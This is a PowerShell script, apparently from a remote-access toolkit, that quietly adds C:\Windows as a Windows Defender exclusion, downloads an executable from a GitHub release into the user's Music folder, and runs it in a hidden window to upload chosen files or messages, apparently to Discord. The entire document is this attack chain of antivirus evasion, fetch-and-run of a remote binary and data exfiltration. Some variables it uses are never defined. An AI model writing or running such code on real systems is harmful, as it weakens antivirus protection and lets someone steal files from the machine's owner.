[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
#Exclusion additon.
try {
    $exclusionPath = "C:\Windows"
    Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue -ErrorVariable AddExclusionError | Out-Null
    if (-not $AddExclusionError) {
    }
  }
  catch {}
  
$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
$exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
Invoke-WebRequest -Uri $url -OutFile $exepath
$option = Read-Host "Enter 'm' to send messages or 'f' to send files"   
if ($option.ToLower() -eq "f") {
    $fileInput = Read-Host "Enter the file(s) or pattern (e.g., musi*):"
    $files = Get-ChildItem $fileInput
    foreach ($file in $files) {
        $arguments = "-File ""$($file.FullName)"""
        Start-Process -FilePath $exepath -ArgumentList $arguments -WindowStyle Hidden
    }
}
elseif ($option.ToLower() -eq "m") {
    $message = Read-Host "Enter the message you want to send"
    $message = """$message"""  # Adding double quotes around the message
    Start-Process -FilePath $exepath -ArgumentList $message -WindowStyle Hidden
}
if ($null -ne $output) {
    Remove-Item -Path $exepath -Recurse -Force -ErrorAction SilentlyContinue
}
